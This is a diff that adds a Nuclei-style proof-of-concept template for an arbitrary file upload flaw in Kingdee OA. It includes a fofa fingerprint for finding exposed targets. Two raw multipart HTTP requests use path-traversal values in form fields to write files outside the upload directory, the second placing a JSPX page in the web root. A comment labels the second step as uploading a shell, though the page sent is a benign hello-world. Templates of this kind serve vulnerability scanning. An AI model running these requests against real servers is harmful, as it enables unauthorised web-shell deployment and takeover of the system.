@@ -1,0 +1,178 @@
+id: poc-rikclo4smra6teyw
+info:
+  name: ⾦蝶OA KingdeeOA PostilUpload 任意⽂件上传
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rikclo4smra6teyw'
+  tags: file-upload,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rikclo4smra6teyw
+    fofa: ⾦蝶OA_V7.0
+http:
+- raw:
+  - 'POST /KingdeeOA/upload.do?m=officeUpload&id=1&uuid=2 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 463
+
+    Cache-Control: max-age=0
+
+    Origin: [http://xx.xx.xx.xx:7890](http://xx.xx.xx.xx:7890)
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoPv4NqpaclOcBTeT
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Referer: [http://xx.xx.xx.xx:7890/KingdeeOA/modules/news/news.do?method=issue&left_menu_id=113](http://xx.xx.xx.xx:7890/KingdeeOA/modules/news/news.do?method=issue&left_menu_id=113)
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+
+    Connection: keep-alive
+
+
+    ------WebKitFormBoundaryoPv4NqpaclOcBTeT
+
+    Content-Disposition: form-data; name="token"
+
+    Content-Type: text/plain
+
+
+    11
+
+    ------WebKitFormBoundaryoPv4NqpaclOcBTeT
+
+    Content-Disposition: form-data; name="userId"
+
+    Content-Type: text/plain
+
+
+    ../../../workflow/temporary/scan_temp_test
+
+    ------WebKitFormBoundaryoPv4NqpaclOcBTeT
+
+    Content-Disposition: form-data; name="upload"; filename="1.txt"
+
+    Content-Type: text/plain
+
+
+    test
+
+    ------WebKitFormBoundaryoPv4NqpaclOcBTeT--
+
+
+    **2.上传shell**'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /KingdeeOA/PostilUpload HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 1230
+
+    Cache-Control: max-age=0
+
+    Origin: [http://xx.xx.xx.xx:7890](http://xx.xx.xx.xx:7890)
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoPv4NqpaclOcBTeT
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Referer: [http://xx.xx.xx.xx:7890/KingdeeOA/modules/news/news.do?method=issue&left_menu_id=113](http://xx.xx.xx.xx:7890/KingdeeOA/modules/news/news.do?method=issue&left_menu_id=113)
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+
+    Connection: keep-alive
+
+
+    ------WebKitFormBoundaryoPv4NqpaclOcBTeT
+
+    Content-Disposition: form-data; name="NewFile"
+
+    Content-Type: image/jpeg
+
+
+    <?xml version="1.0" encoding="UTF-8"?>
+
+    <jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
+
+    <jsp:directive.page contentType="text/html; charset=UTF-8"/>
+
+    <html xmlns="http://www.w3.org/1999/xhtml" lang="en">
+
+    <head>
+
+    <title>JSPX Hello World</title>
+
+    </head>
+
+    <body>
+
+    <h1>
+
+    <jsp:element name="span">
+
+    <jsp:attribute name="style">color: blue;</jsp:attribute>
+
+    <jsp:body>Hello World from JSPX!</jsp:body>
+
+    </jsp:element>
+
+    </h1>
+
+    </body>
+
+    </html>
+
+    </jsp:root>
+
+    ------WebKitFormBoundaryoPv4NqpaclOcBTeT
+
+    Content-Disposition: form-data; name="method"
+
+    Content-Type: text/html
+
+
+    workflowScan
+
+    ------WebKitFormBoundaryoPv4NqpaclOcBTeT
+
+    Content-Disposition: form-data; name="filetype"
+
+    Content-Type: text/html
+
+
+    ../../../../../KingdeeOA/firstframe/webapp/1.jspx
+
+    ------WebKitFormBoundaryoPv4NqpaclOcBTeT
+
+    Content-Disposition: form-data; name="userId"
+
+    Content-Type: text/html
+
+
+    test/
+
+    ------WebKitFormBoundaryoPv4NqpaclOcBTeT--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
